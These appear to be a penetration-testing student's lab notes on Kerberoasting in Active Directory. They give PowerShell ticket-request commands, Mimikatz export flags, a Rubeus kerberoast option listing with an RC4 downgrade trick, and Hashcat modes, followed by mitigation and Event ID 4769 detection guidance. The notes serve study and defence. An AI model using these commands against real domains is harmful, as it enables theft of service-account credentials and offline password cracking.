# Kerberoasting - from Windows

## Semi-Manual Method

Before tools like Rubeus, ticket theft/forging was a complex manual process. Understanding the manual route builds real understanding before reaching for automation.

`-Q */*` = query all SPNs. Ignore computer accounts (`$`-suffixed) — focus on **user** accounts with SPNs.
 Next, using PowerShell, we can request TGS tickets for an account in the shell above and load them into memory. Once they are loaded into memory, we can extract them using `Mimikatz`
 
### Request a Ticket for One User (into memory)

```powershell
PS C:\htb> Add-Type -AssemblyName System.IdentityModel
PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-2
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 2/24/2022 11:36:22 PM
ValidTo              : 2/25/2022 8:55:25 AM
ServicePrincipalName : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
```

**What this does** (essentially what [Rubeus](https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1) does under the hood by default):
- The [Add-Type](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.2) cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object
- The `-AssemblyName` parameter allows us to specify an assembly that contains types that we are interested in using
- [`System.IdentityModel`](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel?view=netframework-4.8) — namespace containing classes for building security token services
- [`New-Object`](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/new-object?view=powershell-7.2) — instantiates a .NET Framework object
- [`System.IdentityModel.Tokens`](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens?view=netframework-4.8)`.`[`KerberosRequestorSecurityToken`](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken?view=netframework-4.8) — requests a Kerberos TGS ticket for the given SPN, loaded into the current logon session

`base64 /out:true` = print base64 output to console instead of writing `.kirbi` files directly. `kerberos::list /export` = dump loaded tickets. If `/out:true` is omitted, Mimikatz writes `.kirbi` files to disk directly — often simpler if file transfer to the attack host is easy.

### Prepare the Base64 Blob for Cracking

```shellsession
s0nam@htb[/htb]$ echo "<base64 blob>" |  tr -d \\n
```

Strips newlines/whitespace (the console output is column-wrapped) so it's all on one line.

### Convert Back to .kirbi

```shellsession
s0nam@htb[/htb]$ cat encoded_file | base64 -d > sqldev.kirbi
```

```powershell
    Perform Kerberoasting, outputting hashes in the file output format, but to the console:
        Rubeus.exe kerberoast /simple [[/spn:"blah/blah"] | [/spns:C:\temp\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/nowrap]

        Rubeus.exe kerberoast </spn:"blah/blah" | /spns:C:\temp\spns.txt> </ticket:BASE64 | /ticket:FILE.KIRBI> [/nowrap]

    Perform Kerberoasting with an existing TGT using an enterprise principal:
        Rubeus.exe kerberoast </spn:user@domain.com | /spns:user1@domain.com,user2@domain.com> /enterprise </ticket:BASE64 | /ticket:FILE.KIRBI> [/nowrap]

    Perform Kerberoasting with an existing TGT and automatically retry with the enterprise principal if any fail:
        Rubeus.exe kerberoast </ticket:BASE64 | /ticket:FILE.KIRBI> /autoenterprise [/ldaps] [/nowrap]

    Perform Kerberoasting using the tgtdeleg ticket to request service tickets - requests RC4 for AES accounts:
        Rubeus.exe kerberoast /usetgtdeleg [/ldaps] [/nowrap]

    Perform "opsec" Kerberoasting, using tgtdeleg, and filtering out AES-enabled accounts:
        Rubeus.exe kerberoast /rc4opsec [/ldaps] [/nowrap]

    List statistics about found Kerberoastable accounts without actually sending ticket requests:
        Rubeus.exe kerberoast /stats [/ldaps] [/nowrap]

    Perform Kerberoasting, requesting tickets only for accounts with an admin count of 1 (custom LDAP filter):
        Rubeus.exe kerberoast /ldapfilter:'admincount=1' [/ldaps] [/nowrap]

    Perform Kerberoasting, requesting tickets only for accounts whose password was last set between 01-31-2005 and 03-29-2010, returning up to 5 service tickets:
        Rubeus.exe kerberoast /pwdsetafter:01-31-2005 /pwdsetbefore:03-29-2010 /resultlimit:5 [/ldaps] [/nowrap]

    Perform Kerberoasting, with a delay of 5000 milliseconds and a jitter of 30%:
        Rubeus.exe kerberoast /delay:5000 /jitter:30 [/ldaps] [/nowrap]

        Rubeus.exe kerberoast /aes [/ldaps] [/nowrap]
```

> [!tip] Old accounts = weak passwords
> If SPN accounts show password-last-set dates 5+ years old, they're prime targets — likely set once during a less mature security era and never rotated.

## A Note on Encryption Types

> [!warning] Lab caveat
> These examples aren't reproducible in the module lab (DC runs Server 2019) — included for conceptual understanding.

Kerberoasting tools default to requesting **RC4** encryption ([weaker](https://www.stigviewer.com/stigs/microsoft_windows_10/2025-02-25/finding/V-220936), faster to crack). Hashes typically start `$krb5tgs$23$*` (RC4, type 23). Sometimes AES-256 (type 18, `$krb5tgs$18$*`) and  AES-128 (type 17) is returned instead — [crackable](https://github.com/hashcat/hashcat/pull/1955) but **significantly slower**.

### The /tgtdeleg Downgrade Trick

![[Pasted image 20260726181128.png]]

`/tgtdeleg` forces the request to advertise **only RC4** support in the TGS request body, regardless of the account's actual configured encryption types — likely a backward-compatibility failsafe in AD. This downgrades AES-configured accounts back to crackable RC4 tickets, potentially saving hours of cracking time on a real GPU rig.

> [!warning] Doesn't work against Server 2019 DCs
> Regardless of domain functional level, a **Windows Server 2019** DC always returns a ticket encrypted with the account's **highest supported** encryption level — the downgrade trick fails here. On **Server 2016 or earlier** DCs (still common), enabling AES on an SPN account does **not** protect against Kerberoasting the way you'd expect — an attacker can still request an RC4 ticket via this trick. Only Server 2019 DCs properly enforce the AES-256 ticket even when downgrade is attempted.

### Configuring Allowed Kerberos Encryption Types (Defensive Reference)

`Group Policy → Default Domain Policy → Computer Configuration → Policies → Windows Settings → Security Settings → Local Policies → Security Options → "Network security: Configure encryption types allowed for Kerberos"`

> [!danger] Do not remove AES support
> Removing all types except `RC4_HMAC_MD5` reproduces the 2019 downgrade scenario intentionally — never do this. Removing RC4 support entirely can also have operational impacts and needs thorough testing before rollout.

## Mitigation & Detection

### Mitigation

- Use **long, complex, non-dictionary passwords/passphrases** for any unmanaged service accounts
- Prefer **[Managed Service Accounts (MSA)](https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/managed-service-accounts-understanding-implementing-best/ba-p/397009)** / **[Group Managed Service Accounts (gMSA)](https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview)** — very complex, auto-rotating passwords (like machine accounts), or accounts managed via **LAPS**
- Restrict RC4 usage for Kerberos requests by service accounts specifically (test thoroughly first)
- Never use Domain Admins or other highly privileged accounts as SPN accounts if avoidable

### Detection

Kerberoasting generates an abnormal volume of **TGS-REQ / TGS-REP** traffic. Enable via GPO: **[Audit Kerberos Service Ticket Operations](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-kerberos-service-ticket-operations)**.

This produces:
- **[Event ID 4769](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4769)** — A Kerberos service ticket was requested
- **[Event ID 4770](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4770)** — A Kerberos service ticket was renewed

> [!tip] Baseline vs. anomaly
> 10-20 TGS requests for a given account is typically normal. A **large spike of 4769 events from one account in a short window** is a strong Kerberoasting indicator.

**Reading a 4769 event:** shows requesting account (attacker, e.g. `htb-student`), target account (e.g. `sqldev`), and **ticket encryption type** — `0x17` (hex) = `23` decimal = RC4. An RC4 ticket request on a weak-password account is the signature of a likely successful attack in progress.

Further reading: [Sean Metcalf's post on Kerberoasting mitigation/detection](https://adsecurity.org/?p=3458).

## Key Takeaways

- [ ] Manual method: `setspn.exe -Q */*` → `KerberosRequestorSecurityToken` in PowerShell → extract with Mimikatz (`kerberos::list /export`) → `kirbi2john.py` → reformat → Hashcat
- [ ] Automated: PowerView's `Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat`, or **Rubeus** (`kerberoast /stats`, `/ldapfilter:'admincount=1'`, `/nowrap`)
- [ ] Hashcat modes: `13100` (RC4, etype 23) vs `19700` (AES-256, etype 18) — AES cracking is dramatically slower
- [ ] `/tgtdeleg` can downgrade AES tickets to RC4 — but fails against Server 2019 DCs specifically
- [ ] Never strip RC4 encryption entirely without heavy testing; never strip AES support (creates the downgrade vulnerability intentionally)
- [ ] Detection hinges on Event ID 4769 volume spikes + checking the ticket encryption type field (`0x17` = RC4)
- [ ] MSA/gMSA/LAPS-managed accounts are the real fix — auto-rotating complex passwords defeat offline cracking
